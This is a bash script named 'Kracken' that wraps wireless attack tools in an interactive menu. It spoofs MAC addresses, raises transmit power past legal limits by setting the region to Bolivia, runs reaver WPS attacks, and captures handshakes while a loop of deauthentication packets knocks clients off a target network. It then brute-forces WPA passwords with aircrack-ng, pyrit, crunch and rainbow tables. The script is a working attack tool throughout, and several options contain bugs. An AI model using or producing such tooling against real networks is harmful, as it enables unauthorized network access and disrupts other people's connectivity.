#!/bin/bash



#Configuration:

  HANDSHAKE='/root/Handshakes/HandShake*.cap'
  WORDLIST='/usr/share/wordlists/rockyou.txt'
  COWPATTY='/root/Rainbow/cowpatty'
  AIROLIB='/root/Rainbow/airolib'
  MONITER=mon0
 
#End configuration

    clear
   
  echo "***********[Kracken V-1.0]***********"
  echo "*                                   *"
  echo "*  Wrtten by: Joshua Hofffman       *"
  echo "*                                   *"
  echo "**************[WARNING]**************"
  echo "*                                   *"
  echo "*  This script can cause damage to  *"
  echo "*  your hardware and/or network. I  *"
  echo "*  am not responsible for any down  *"
  echo "*  time or damages caused. You are  *"
  echo "*  responsible for scripts you run  *"
  echo "*                                   *"
  echo "********[Use at your own risk]*******"
  echo ""
  echo ""
  echo "======[Press enter to continue]======"

    read START
 
      if [[ $START == "" ]]; then
   
    sleep 1
    clear
     
      fi

      while true
      do
   
    clear
   
  echo "*******************[Main Menu]**********************"
  echo "*                                                  *"
  echo "* (1) View handshakes                              *"
  echo "* (2) View interfaces                              *"
  echo "* (3) Spoof MAC                                    *"
  echo "* (4) Boost wireless card                          *"
  echo "* (5) Start moniter interface                      *"
  echo "* (6) Run wash                                     *"
  echo "* (7) Run airodump                                 *"
  echo "* (8) Capture handshakes                           *"
  echo "* (9) Create rainbow table                         *"
  echo "* (10) Run reaver                                  *"
  echo "* (11) Run aircrack-ng                             *"
  echo "* (12) Run pyrit                                   *"
  echo "* (13) Restore wireless interface                  *"
  echo "* (14) Bruteforce calculator                       *"
  echo "*                                                  *"
  echo "* (15) Exit                                        *"
  echo "*                                                  *"
  echo "****************************************************"
  echo ""

    read n
 
      case $n in
     
1)

	xterm -hold -e "aircrack-ng $HANDSHAKE" & ;;
     
2)

	xterm -hold -e iwconfig & ;;
     
3)
 
    clear
 
  echo "*************************************************"
  echo "* Please select a wireless interface from below *"
  echo "*************************************************"
  echo ""
 
	iwconfig
	
  echo ""
  echo "*************************************************"
  echo ""
     
    read WIRELESS
   
      [[ $WIRELESS == "" ]]
     
    sleep 1
    clear
     
  echo "Shutting down $WIRELESS..."
  echo ""
 
    sleep 1
   
	ifconfig $WIRELESS down
     
  echo "Changing to random MAC..."
  echo ""
 
    sleep 1
   
	macchanger -r $WIRELESS
     
  echo""   
  echo "Bringing spoffed interface up..."
  echo ""
   
	ifconfig $WIRELESS up
	
    sleep 3 
    clear ;;
   
4)

    clear
   
  echo ""
  echo "*****************[WARNING]********************"
  echo "*                                            *"
  echo "* Setting your wireless card at a power      *"
  echo "* higher than the OEM spec can damage your   *"
  echo "* card.                                      *"
  echo "*                                            *"
  echo "**********************************************"
  echo ""
  echo ""
  echo "========Do you wish to proceed[y/n]?=========="
  echo ""
 
    read START
 
      if [[ $START == "y" ]]; then
   
    sleep 1
    clear
   
  echo "*************************************************"
  echo "* Please select a wireless interface from below *"
  echo "*************************************************"
  echo ""
 
	iwconfig
	
  echo ""
  echo "*************************************************"
  echo ""
 
    read WIRELESS0
   
      [[ $WIRELESS0 == "" ]]
     
    sleep 1
    clear
 
 
  echo "Setting country to BO (Bolivia)..."
  echo ""
 
    sleep 1
   
      iw reg set BO

  echo "Boosting power on $WIRELESS0..."
  echo ""
 
      iwconfig $WIRELESS0 txpower 30
 
    sleep 3
   
      else
     
    echo ""
    echo "Returning to script..."
   
    sleep 3
   
      fi;;
     
5)

    clear
     
  echo "*************************************************"
  echo "* Please select a wireless interface from below *"
  echo "*************************************************"
  echo ""
     
	iwconfig
	
  echo ""
  echo "*************************************************"
  echo ""
 
    read WIRELESS2
      [[ $WIRELESS2 == "" ]]
     
    sleep 1
    clear
   
  echo "Starting interface on $WIRELESS2..."
 
    sleep 1
   
	airmon-ng start $WIRELESS2
     
    sleep 3
    clear ;;
   
6)

      xterm -hold -e wash -i $MONITER -C & ;;
     
7)

      xterm -hold -e airodump-ng $MONITER & ;;
     
8)

    clear
   
      cd ~
   
    mkdir Handshakes &> /dev/null
     
  echo "**********************************"
  echo "* Please enter the network BSSID *"
  echo "**********************************"
  echo ""
 
    read BSSID
      [[ $BSSID == "" ]]
     
    clear
   
  echo "************************************"
  echo "* Please enter the network channel *"
  echo "************************************"
  echo ""
 
    read CHNEL
      [[ $CHNEL == "" ]]
     
	xterm -hold -e "airodump-ng --ig -w Handshakes/HandShake -c $CHNEL --bssid $BSSID $MONITER" &
     
    sleep 5 &&
   
	xterm -hold -e "while true; do sleep 5; aireplay-ng -0 5 -q 2 --ig -a $BSSID $MONITER; done" & ;;
	
9)
	   
	      while true
	      do
	   
	    clear
	   
	  echo "****************[Rainbow tables]********************"
	  echo "*                                                  *"
	  echo "* (1) View handshakes                              *"
	  echo "* (2) Import rockyou.txt                           *"
	  echo "* (3) Import wordlist                              *"
	  echo "* (4) Import custom crunch                         *"
	  echo "* (5) Add ESSID                                    *"
	  echo "* (6) Remove ESSID                                 *"
	  echo "* (7) View ESSIDs                                  *"
	  echo "* (8) Create rainbow table                         *"
	  echo "* (9) View rainbow tables                          *"
	  echo "* (10) Export to airolib                           *"
	  echo "* (11) Export to cowpatty                          *"
	  echo "*                                                  *"
	  echo "* (12) Return to main script                       *"
	  echo "*                                                  *"
	  echo "****************************************************"
	  echo ""

	    read n
	   
	      case $n in
	   
	1)
	
	    clear
	     
		  xterm -hold -e aircrack-ng $HANDSHAKE & ;;
		 
	2)
	
	    clear
	   
	      gunzip /usr/share/wordlists/rockyou.txt.gz &> /dev/null
	     
	    sleep 2
	   
		  xterm -hold -e "pyrit -i $WORDLIST import_passwords" & ;;
	
	3)
	
	    clear
	   
	  echo "***********************************************"
	  echo "* Enter full path to password file for import *"
	  echo "***********************************************"
	  echo ""
	 
	    read READES
		[[ $READES == "" ]]
	   
		  xterm -hold -e "pyrit -i '$READES' import_passwords" & ;;
		 
	4)
	
	    clear
	   
	  echo "****************************************************"
	  echo "* What arguments would you like to pass to crunch? *"
	  echo "****************************************************"
	  echo ""
	 
	    read CRUNCH
	      [[ $CRUNCH == "" ]]
	     
		xterm -hold -e "crunch $CRUNCH|pyrit -i- import_passwords" & ;;
	
	5)
	
	    clear
	   
	  echo "***************"
	  echo "* Enter ESSID *"
	  echo "***************"
	  echo ""
 
	    read READES
	      [[ $READES == "" ]]
	     
		xterm -hold -e "pyrit -e '$READES' create_essid" & ;;
		
	6)
	
	    clear
	   
	  echo "***************"
	  echo "* Enter ESSID *"
	  echo "***************"
	  echo ""
 
	    read READES
	      [[ $READES == "" ]]
	     
		xterm -hold -e "pyrit -e '$READES' delete_essid" & ;;

	7)
	
	    clear
	   
		xterm -hold -e "pyrit list_essids" & ;;
		
	8)
	
	    clear
	   
	  echo "***************"
	  echo "* Enter BSSID *"
	  echo "***************"
	  echo ""
	 
	    read READBS
	      [[ $READBS == "" ]]
	   
		xterm -hold -e "pyrit -i- -b $READBS batch" & ;;
		
	9)
	
	    clear
	   
		xterm -hold -e "pyrit eval" & ;;
		
	10)
	
	    clear
	   
	      cd ~
	     
	    mkdir Rainbow &> /dev/null
	   
		xterm -hold -e "pyrit -o $AIROLIB export_hashdb" & ;;
		
	11)
	
	  clear
	 
	   cd ~
	     
	  mkdir Rainbow &> /dev/null
	   
		xterm -hold -e "pyrit -o $COWPATTY export_hashdb" & ;;
	 
		
	12)
	
	    clear
	    break;;
	   
	*)
	
	    clear
	   
	  echo "*******************************************"
	  echo "* Invalid option. Press any key to return *"
	  echo "*******************************************"
	
	    read -p "";;
	
	      esac
	 
	    sleep 1
	
	      done;;
     
10)
 
    clear
   
  echo "****************************************************"
  echo "* Enter BSSID you would like to attack with reaver *"
  echo "****************************************************"
  echo ""
 
    read RBSSID
      [[ $RBSSID == "" ]]
     
    sleep 1
    clear
   
  echo "***************************************************************"
  echo "* Enter arguments you would like to pass to reaver [optional] *"
  echo "***************************************************************"
  echo ""
 
    read REAVERA
      [[ $REAVERA == "" ]]
     
  echo "Starting reaver attack..."
 
    sleep 3
    clear
   
     xterm -hold -e "reaver -i $MONITER -b $RBSSID $REAVERA -vv" & ;;
     
11)
	 
	      while true
	      do
	   
	    clear
	   
	  echo "*****************[Aircrack-ng]**********************"
	  echo "*                                                  *"
	  echo "* (1) View handshakes                              *"
	  echo "* (2) Use rockyou.txt                              *"
	  echo "* (3) Bruteforce 8 numeric                         *"
	  echo "* (4) Bruteforce 9 numeric                         *"
	  echo "* (5) Bruteforce 10 numeric                        *"
	  echo "* (6) Bruteforce 8 a-z                             *"
	  echo "* (7) Bruteforce 8 A-Z                             *"
	  echo "* (8) Bruteforce 8 a-z + numeric                   *"
	  echo "* (9) Bruteforce 8 A-Z + numeric                   *"
	  echo "* (10) Bruteforce 8 a-z + A-Z                      *"
	  echo "* (11) Bruteforce custom                           *"
	  echo "* (12) Specify wordlist                            *"
	  echo "* (13) Use rainbow table                           *"
	  echo "*                                                  *"
	  echo "* (14) Exit to main script                         *"
	  echo "*                                                  *"
	  echo "****************************************************"
	  echo ""

	    read n
	   
	      case $n in
	   
	1)

		xterm -hold -e aircrack-ng $HANDSHAKE & ;;

	2)

	    clear
	   
	  echo "Decompressing rockyou.txt..."
	  echo ""
	 
	    gunzip /usr/share/wordlists/rockyou.txt.gz &> /dev/null
	    sleep 1
	   
	  echo "Starting attack..."
	  echo ""
	 
	    sleep 3
	   
		xterm -hold -e aircrack-ng -w $WORDLIST $HANDSHAKE & ;;

	3)

	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read FKUAC
	      [[ $FKUAC == "" ]]
	 
	    sleep 1
     
	  echo "Starting bruteforce 8 numeric"
	  echo ""
	 
		xterm -hold -e "crunch 8 8 1234567890|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE" & ;;

	4)

	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read FKUAC
	      [[ $FKUAC == "" ]]
	     
	  echo "Starting bruteforce 9 numeric"
	  echo ""
	 
		xterm hold -e "crunch 9 9 1234567890|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE" & ;;

	5)
	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read FKUAC
	      [[ $FKUAC == "" ]]
	     
	  echo "Starting bruteforce 10 numeric"
	  echo ""
	 
		xterm -hold -e "crunch 10 10 1234567890|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE" & ;;
		
	6)
	   
	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"#
	  echo "*****************************************************"
	  echo ""
	 
	    read FKUAC
	      [[ $FKUAC == "" ]]
	     
	  echo "Starting bruteforce 8 a-z"
	  echo ""
	 
		xterm -hold -e "crunch 8 8 abcdefghijklmnopqrstuvwxyz|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE" & ;;

	7)

	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""#
	 
	    read FKUAC
	      [[ $FKUAC == "" ]]
	     
	  echo "Starting bruteforce 8 A-Z"
	  echo ""
	 
		xterm -hold -e "crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE" & ;;

	8)

	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""#
	 
	    read FKUAC
	      [[ $FKUAC == "" ]]
	     
	  echo "Starting bruteforce 8 a-z numeric"
	  echo ""
	 
		xterm -hold -e "crunch 8 8 abcdefghijklmnopqrstuvwxyz1234567890|aircrack-ng -a 2 -w- -b $FKUAC #$HANDSHAKE" & ;;

	9)

	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read FKUAC
	      [[ $FKUAC == "" ]]
	      #
	  echo "Starting bruteforce 8 A-Z numeric"
	  echo ""
	 
		xterm -hold -e "crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE" & ;;

	10)

	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read FKUAC
	      [[ $FKUAC == "" ]]
	      #
	  echo "Starting bruteforce 8 a-z A-Z"
	  echo ""
	 
		xterm -hold -e "crunch 8 8 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE" & ;;

	11)

	    clear

	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read FKUAC
	      [[ $FKUAC == "" ]]
	     
	    clear
	   
	  echo "****************************************************"   
	  echo "* What arguments would you like to pass to crunch? *"
	  echo "****************************************************"
	  echo ""
	 
	    read CRUNCH
	      [[ $CRUNCH == "" ]]
	     
	  echo ""
	  echo "Starting custom bruteforce attack"
	  echo ""
	 
		xterm -hold -e "crunch $CRUNCH|aircrack-ng -a 2 -w- -b $FKUAC $HANDSHAKE" & ;;
		
	12)
	
	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read FKUAC
	      [[ $FKUAC == "" ]]
	     
	    clear
	     
	  echo "**********************************************"
	  echo "* Please enter the full path to the wordlist *"
	  echo "**********************************************"
	  echo ""
	 
	    read WCUST
	      [[ $WCUST == "" ]]
	     
	  echo ""
	  echo "Attacking with $WCUST"
	  echo ""
	     
		xterm -hold -e "aircrack-ng -a 2 -w '$WCUST' -b $FKUAC $HANDSHAKE" & ;;
		
	13)
	
	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read FKUAC
	      [[ $FKUAC == "" ]]
	     
	  echo ""
	  echo "Attacking with airolib hash table"
	  echo ""
	 
		xterm -hold -e "aircrack-ng -r '$AIROLIB' -b $FKUAC $HANDSHAKE" & ;;
		
	14)
	 
	    clear
	    break;;
	   
	*)
     
	    clear
     
	  echo "*******************************************"
	  echo "* Invalid option. Press any key to return *"
	  echo "*******************************************"
	
	    read -p ""
	   
	    esac
	
	sleep 1
	
	    done;;

		 
12)
	 
	      while true
	      do
	     
	    clear
	   
	  echo "*********************[Pyrit]************************"
	  echo "*                                                  *"
	  echo "* (1) View handshakes                              *"
	  echo "* (2) Use rockyou.txt                              *"
	  echo "* (3) Bruteforce 8 numeric                         *"
	  echo "* (4) Bruteforce 9 numeric                         *"
	  echo "* (5) Bruteforce 10 numeric                        *"
	  echo "* (6) Bruteforce 8 a-z                             *"
	  echo "* (7) Bruteforce 8 A-Z                             *"
	  echo "* (8) Bruteforce 8 a-z + numeric                   *"
	  echo "* (9) Bruteforce 8 A-Z + numeric                   *"
	  echo "* (10) Bruteforce 8 a-z + A-Z                      *"
	  echo "* (11) Bruteforce custom                           *"
	  echo "* (12) Specify wordlist                            *"
	  echo "* (13) Use rainbow table                           *"
	  echo "* (14) Benchmark pyrit                             *"
	  echo "*                                                  *"
	  echo "* (15) Exit to main script                         *"
	  echo "*                                                  *"
	  echo "****************************************************"
	  echo ""

	    read n
	   
	      case $n in
	   
	1)

		xterm -hold -e aircrack-ng $HANDSHAKE & ;;

	2)

	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read PYRITB
	      [[ $PYRITB == "" ]]
	   
	  echo "Decompressing rockyou.txt..."
	  echo ""
	 
	    gunzip /usr/share/wordlists/rockyou.txt.gz &> /dev/null
	    sleep 2
	   
	  echo "Starting attack..."
	  echo ""
	 
	    sleep 3
	   
		xterm -hold -e  "pyrit -i '$WORDLIST' -r '$HANDSHAKE' -b '$PYRITB' attack_passthrough" & ;;

	3)
	
	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read PYRITB
	      [[ $PYRITB == "" ]]
	     
	  echo "Starting bruteforce 8 numeric"
	  echo ""
	 
		xterm -hold -e "crunch 8 8 1234567890|pyrit -i '$WORDLIST' -r '$HANDSHAKE' -b '$PYRITB' attack_passthrough" & ;;

	4)

	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read PYRITB
	      [[ $PYRITB == "" ]]
	     
	  echo "Starting bruteforce 9 numeric"
	  echo ""
	 
		xterm -hold -e "crunch 9 9 1234567890|pyrit -i '$WORDLIST' -r '$HANDSHAKE' -b '$PYRITB' attack_passthrough" & ;;

	5)
	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read PYRITB
	      [[ $PYRITB == "" ]]
	     
	  echo "Starting bruteforce 10 numeric"
	  echo ""
	 
		xterm -hold -e "crunch 10 10 1234567890|pyrit -i '$WORDLIST' -r '$HANDSHAKE' -b '$PYRITB' attack_passthrough" & ;;
		
	6)
	   
	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read PYRITB
	      [[ $PYRITB == "" ]]
	     
	  echo "Starting bruteforce 8 a-z"
	  echo ""
	 
		xterm -hold -e "crunch 8 8 abcdefghijklmnopqrstuvwxyz|pyrit -i '$WORDLIST' -r '$HANDSHAKE' -b '$PYRITB' attack_passthrough" & ;;

	7)

	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read PYRITB
	      [[ $PYRITB == "" ]]
	     
	  echo "Starting bruteforce 8 A-Z"
	  echo ""
	 
		xterm -hold -e "crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ|pyrit -i '$WORDLIST' -r '$HANDSHAKE' -b '$PYRITB' attack_passthrough" & ;;

	8)

	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read PYRITB
	      [[ $PYRITB == "" ]]
	     
	  echo "Starting bruteforce 8 a-z numeric"
	  echo ""
	 
		xterm -hold -e "crunch 8 8 abcdefghijklmnopqrstuvwxyz1234567890|pyrit -i '$WORDLIST' -r '$HANDSHAKE' -b '$PYRITB' attack_passthrough" & ;;

	9)

	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read PYRITB
	      [[ $PYRITB == "" ]]
	     
	  echo "Starting bruteforce 8 A-Z numeric"
	  echo ""
	 
		xterm -hold -e "crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890|pyrit -i '$WORDLIST' -r '$HANDSHAKE' -b '$PYRITB' attack_passthrough" & ;;

	10)

	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read PYRITB
	      [[ $PYRITB == "" ]]
	     
	  echo "Starting bruteforce 8 a-z A-Z"
	  echo ""
	 
		xterm -hold -e "crunch 8 8 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ|pyrit -i '$WORDLIST' -r '$HANDSHAKE' -b '$PYRITB' attack_passthrough" & ;;

	11)

	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read PYRITB
	      [[ $PYRITB == "" ]]
	     
	    clear
	   
	  echo "****************************************************"   
	  echo "* What arguments would you like to pass to crunch? *"
	  echo "****************************************************"
	  echo ""
	 
	    read PYRITB
	      [[ $PYRITB == "" ]]
	     
	  echo ""
	  echo "Starting custom bruteforce attack"
	  echo ""
	 
		xterm -hold -e "crunch $CRUNCH|pyrit -i '$WORDLIST' -r '$HANDSHAKE' -b '$PYRITB' attack_passthrough" & ;;
		
	12)
	
	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read PYRITB
	      [[ $PYRITB == "" ]]
	     
	    clear
	     
	  echo "**********************************************"
	  echo "* Please enter the full path to the wordlist *"
	  echo "**********************************************"
	  echo ""
	 
	    read WCUST
	      [[ $WCUST == "" ]]
	     
	  echo ""
	  echo "Attacking with $WCUST"
	  echo ""
	     
		xterm -hold -e "pyrit -i '$WCUST' -r '$HANDSHAKE' -b '$PYRITB' attack_passthrough" & ;;
	   
	13)
	
	    clear
	   
	  echo "*****************************************************"
	  echo "* Please enter the network BSSID you wish to attack *"
	  echo "*****************************************************"
	  echo ""
	 
	    read PYRITB
	      [[ $PYRITB == "" ]]
	
	  echo ""
	  echo "Attacking with rainbow table"
	  echo ""
	 
		xterm -hold -e "pyrit -r '$HANDSHAKE' -b '$PYRITB' attack_db" & ;;
	
	14)
	
	    clear
	   
		xterm -hold -e "pyrit benchmark" & ;;
		
	15)
	 
	    clear
	    break;;
	   
	*)
     
	    clear
     
	  echo "*******************************************"
	  echo "* Invalid option. Press any key to return *"
	  echo "*******************************************"
	
	    read -p ""
	   
	  esac
	 
	sleep 1
	
	  done;;
     
13)

    clear

  echo "*************************************************"
  echo "* Please select a wireless interface from below *"
  echo "*************************************************"
  echo ""
     
	iwconfig
	
  echo ""
  echo "*************************************************"
  echo ""
 
    read WIRELESS3
      [[ $WIRELESS3 == "" ]]
   
    clear
   
  echo "Resetting country..."
  echo ""
 
    sleep 1
 
	iw reg set BO
	
  echo "Resetting power..."
  echo ""
 
	iwconfig $WIRELESS3 txpower 20
 
    sleep 1
   
  echo "Disabling moniter mode..."
  echo ""
 
    sleep 1
   
	airmon-ng stop $MONITER
	
  echo "Shutting down main wireless interface..."
  echo ""
 
    sleep 1
   
	ifconfig $WIRELESS3 down
	
  echo "Restoring perment MAC..."
  echo ""
 
    sleep 1
   
	macchanger -p $WIRELESS3
	
  echo "Bringing main wireless interface back up..."
  echo ""
 
    sleep 1
   
	ifconfig $WIRELESS3 up
	
  echo "Wireless interface restored"
  echo ""
 
    sleep 3;;
   
14)

    clear
   
  echo "*************************"
  echo "* Enter keys per second *"
  echo "*************************"
  echo ""
   
    read KPS
      [[ $KPS == "" ]]
     
    clear

  echo "*************************"
  echo "* Enter wordlist length *"
  echo "*************************"
  echo ""

    read WLL
      [[ $WLL == "" ]]

	((A=$WLL/$KPS))
   
	((B=$A/60))
   
	((C=$B/60))
   
	((D=$C/24))
   
	((E=$D/7))
   
	((F=$E/52))
   
    clear
   
  echo "****************************" 
  echo "* Bruteforce time estimate *"
  echo "****************************"
  echo ""
  echo ""
 
  echo "SECONDS: $A"
  echo ""
  echo "MINUTES: $B"
  echo ""
  echo "HOURS: $C"
  echo ""
  echo "DAYS: $D"
  echo ""
  echo "WEEKS: $E"
  echo ""
  echo "YEARS: $F"
 
  echo ""
  echo ""
  echo "*************************"
  echo "* Press enter to return *"
  echo "*************************"
   
    read -p "";;
   
15)

    clear
   
  echo "***********"
  echo "* Goodbye *"
  echo "***********"
 
    sleep 3
    clear
    exit;;

*)
 
    clear
 
  echo "*******************************************"
  echo "* Invalid option. Press any key to return *"
  echo "*******************************************"
   
    read -p "";;
 
      esac
   
      done
     
./Kracken.sh



